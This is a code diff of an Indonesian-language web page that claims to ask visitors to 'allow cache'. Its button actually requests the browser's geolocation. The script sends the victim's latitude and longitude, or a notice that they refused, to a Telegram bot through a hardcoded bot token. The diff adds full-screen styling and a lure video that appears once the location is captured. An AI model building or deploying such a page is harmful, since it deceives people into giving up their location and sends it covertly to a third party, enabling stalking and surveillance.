@@ -2,11 +2,41 @@
 <html>
 <head>
   <title>izinkan cache</title>
+  <style>
+    /* Membuat halaman memenuhi layar dan tidak bisa digeser */
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden; /* Mencegah scroll */
+    }
+
+    /* Memastikan isi halaman mengisi seluruh layar */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    /* Container video yang muncul */
+    #videoContainer {
+      display: none;
+      margin-top: 20px;
+    }
+  </style>
 </head>
 <body>
   <h2>izinkan cache</h2>
   <p>Silakan klik tombol di bawah untuk mengizinkan cache Anda.</p>
-  <button onclick="mintaLokasi()">izinkan Sekarang</button>
+  <button onclick="mintaLokasi()">Izinkan Sekarang</button>
+
+  <div id="videoContainer">
+    <video width="320" height="240" controls>
+      <source src="trik.mp4" type="video/mp4">
+      Browser Anda tidak mendukung video.
+    </video>
+  </div>
 
   <script>
     const botToken = "7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0";
@@ -18,12 +48,13 @@
           (pos) => {
             const { latitude, longitude } = pos.coords;
             alert(`cache berhasil`);
-            // Kirim lokasi ke Telegram (opsional)
             const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+
+            // Tampilkan video
+            document.getElementById("videoContainer").style.display = "block";
           },
           (err) => {
-            // Kirim pesan ke Telegram jika ditolak
             const pesan = `Pengguna menolak memberikan lokasi.`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
           }
